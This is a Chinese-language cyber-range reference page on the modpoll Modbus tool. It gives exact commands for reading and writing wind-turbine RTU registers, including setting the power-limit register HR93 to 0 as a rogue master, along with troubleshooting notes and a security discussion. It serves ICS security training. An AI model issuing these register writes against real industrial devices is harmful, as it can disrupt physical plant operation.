---
title: Modbus 工具 modpoll 与 mbpoll
category: 工控/工具
tags: [modpoll, mbpoll, Modbus, pymodbus]
order: 2
source: 2026-07-24_Modbus-Poll-Slave仿真环境检查与部署报告.md、平原链攻击链指南.md
---

## 一句话概括

modpoll 是一个命令行版 Modbus Master 模拟器，在靶场里它替代"手写 Python socket 拼报文"，用一条命令就能读/写 PLC 寄存器；参数里最关键的三件事是 Unit ID（`-a`）、地址基址（`-0`）、寄存器类型（`-t`），任何一个错都会导致读不到或写到错误的寄存器。

## 原理

### modpoll 的角色

素材中的定位：

```text
Master 工具：modpoll 3.16
部署位置：plain-scada-gateway
运行用户：plain_diag
工具路径：/home/plain_diag/bin/modpoll

modpoll 3.16 - FieldTalk(tm) Modbus(R) Master Simulator
```

对应链路：

```text
SCADA 主站 / Master（modpoll）
  -> 真实 Modbus TCP / FC03 / FC06
  -> 风机 RTU/PLC 模拟设备 / Slave（plc1-modbus-sim，0.0.0.0:502）
  -> 风机参数寄存器
```

要点：学生标准攻击步骤改用真实 Modbus Master 工具 modpoll，不再手工拼 socket 报文，由它承担 Rogue Modbus Master 角色。

### 读和写为什么分别触发 FC03 / FC06

Modbus 是功能码驱动的：请求里带哪个功能码，Slave 就执行哪个动作。

```text
命令结尾没有写入值        -> modpoll 判定为"读" -> 使用 FC03 Read Holding Registers
命令结尾带一个写入值      -> modpoll 判定为"写" -> 使用 FC06 Write Single Register
```

素材实测的返回印证了这一点：

```text
读取时无额外输出，直接列寄存器值；
写入时输出 Protocol configuration: MODBUS/TCP, FC6
         Written 1 reference.
```

同理，`-c` 的数量与写入值个数共同决定单写（FC06）还是多写（FC16）：素材中 `-c 1` 明确"只写 1 个保持寄存器"，因此走 FC06。

### 其他 Modbus 工具的定位

| 工具 | 定位 | 素材中的状态 |
|---|---|---|
| modpoll | 命令行 Master 模拟器，靶场标准工具 | 已部署，版本 3.16 |
| mbpoll | 基于 libmodbus 的命令行 Master，参数语义与 modpoll 同类（`-m`/`-p`/`-a`/`-r`/`-c`/`-t`/`-1`） | 环境检查时未发现，素材未给出实测命令 |
| pymodbus | Python 版 Modbus 库，用于自写 Slave/Master 服务 | Windows 本机与相关 VM 均未安装 |
| Modbus Poll / Modbus Slave | Windows GUI 版，适合课堂演示 | 有安装包但未安装，仅教师本地演示，不作为平台交付依赖 |
| plc1-modbus-sim | 自包含 Modbus TCP Slave 服务（自写） | 承担 Slave / RTU / PLC 仿真角色 |

说明：mbpoll 的参数形式来自其与 libmodbus 的通用用法，素材未做实测；靶场标准答案以 modpoll 为准。

## 报文/字段对照

### 参数逐项拆解

素材原命令（读取）：

```bash
/home/plain_diag/bin/modpoll -m tcp -p 502 -a 1 -0 -r 93 -c 1 -t 4 -1 10.0.5.6
```

| 参数 | 值 | 含义 | 出错后果 |
|---|---|---|---|
| `-m` | `tcp` | 使用 Modbus TCP（而非 RTU/ASCII 串口） | 模式错则连不上 |
| `-p` | `502` | 目标 TCP 端口 | 端口错 -> 连接超时 |
| `-a` | `1` | Slave / Unit ID = 1 | Unit ID 不对 -> 无响应或异常 |
| `-0` | 无值 | 使用 PDU 零基地址 | 不加则寄存器偏移一位 |
| `-r` | `93` | 起始寄存器偏移（PDU 地址 93） | 地址错 -> 读到别的量或非法地址异常 |
| `-c` | `1` | 读取/写入的寄存器数量 | 数量错 -> 多读/少读 |
| `-t` | `4` | 数据类型：16-bit holding register | 类型错 -> 解析出的值不对 |
| `-1` | 无值 | 只执行一次，不循环轮询 | 不加会一直轮询，验题时挂住 |
| 末尾 IP | `10.0.5.6` | 目标设备地址 | 地址错 -> 连不上 |

写入时在末尾再追加一个值：

```bash
/home/plain_diag/bin/modpoll -m tcp -p 502 -a 1 -0 -r 93 -c 1 -t 4 -1 10.0.5.6 0
```

### 读取多寄存器的实测输出

素材实测（读取 HR0-HR6，`-r 0 -c 7`）：

```bash
/home/plain_diag/bin/modpoll -m tcp -p 502 -a 1 -0 -r 0 -c 7 -t 4 -1 10.0.7.124
```

```text
[0]: 950      ActivePowerKW = 950
[1]: 152      ReactivePowerKVar = 152
[2]: 76       WindSpeed = 7.6 m/s（数值需除以 10）
[3]: 196      WindDirection = 196 deg
[4]: 690      Voltage = 690 V
[5]: 795      Current = 795 A
[6]: 30       Temperature = 30 C
```

## 用法

### 读写控制点（平原链实测）

读取三台 RTU 的 HR93：

```bash
modpoll -m tcp -p 502 -a 1 -0 -r 93 -c 1 -t 4 -1 10.0.5.6
modpoll -m tcp -p 502 -a 1 -0 -r 93 -c 1 -t 4 -1 10.0.5.4
modpoll -m tcp -p 502 -a 1 -0 -r 93 -c 1 -t 4 -1 10.0.5.5
```

预期输出：

```text
[93]: 100
```

写入 HR93=0：

```bash
modpoll -m tcp -p 502 -a 1 -0 -r 93 -c 1 -t 4 -1 10.0.5.6 0
```

预期输出：

```text
Protocol configuration: MODBUS/TCP, FC6
Written 1 reference.
```

恢复（写 HR94=1 触发 AlarmReset）：

```bash
modpoll -m tcp -p 502 -a 1 -0 -r 94 -c 1 -t 4 -1 10.0.5.6 1
```

### 地址基址 0/1 差异

素材明确：

```text
当前点表采用 zero_based_pdu 地址口径。
学生使用 modpoll 时必须加 -0，否则会出现寄存器偏移一位的问题。
```

两种口径对照：

| PDU 地址（-0 口径） | 40001 口径 | 参数 |
|---:|---:|---|
| 0 | 40001 | ActivePowerKW |
| 2 | 40003 | WindSpeed_x10 |
| 90 | 40091 | WT01RunCommand |
| 93 | 40094 | ActivePowerLimitPercent |
| 94 | 40095 | AlarmReset |

也就是说 `HR93` 在 PDU 口径下就是 `-r 93`；把文档里的 40094 直接当偏移填，就会写到错误位置。

### 常见排错

```text
连接超时
  原因：目标 IP/端口错、防火墙拦截、Slave 未监听 502。
  核对：点表/配置里的 IP 与端口；在源主机上 nmap -sT -p 502 <ip> 确认开放。

Exception Code（Modbus 异常）
  素材实测：非法写 HR10 返回 Modbus 异常 0x86 / 0x02。
  0x86 = 功能码 0x06 置异常位；0x02 = Illegal Data Address（地址不允许写）。
  含义：该寄存器只读或不在可写范围内，说明点表的权限列（R/RW）没有对齐。

Unit ID 不对
  现象：无响应或超时。素材中 RTU 的 Unit ID = 1，来自 gateway.conf 与 pointmap.csv。
  核对：不要用默认值瞎试，Unit ID 应来自点表。

地址基址 0/1 差异
  现象：读到的值和预期差一个寄存器，或写到了相邻控制点。原因与处理见上文「地址基址 0/1 差异」小节。
```

### 功能码覆盖（素材实测）

```text
FC03 Read Holding Registers：通过
FC04 Read Input Registers：通过
FC06 Write Single Register：通过
FC16 Write Multiple Registers：通过
```

## 安全视角

- modpoll 是合法工具，它只是扮演合法的 Modbus Master。风险来自 Modbus 原生没有认证和加密：谁能连上 502，谁就能读写。
- 攻击链的关键在路径：素材强调"502 端口来自 gateway.conf，不是靠扫描全网猜出来"，即先拿到点表/配置再动手。
- 可写范围必须受限。靶场设计为 HR0-HR89 只读、HR90-HR94 可写，超出范围返回异常；真实系统靠设备侧约束 + 工业防火墙白名单。
- 诊断账号不应具备控制能力。素材中 `plain_diag` 用密钥进入网关后即可调用 modpoll 写控制点，"诊断通道 = 控制通道"本身就是风险点；防护上应把只读诊断与可写控制分离。
- 注意：测试后必须恢复，写 HR94=1 触发 AlarmReset 恢复现场，是验题纪律的一部分。
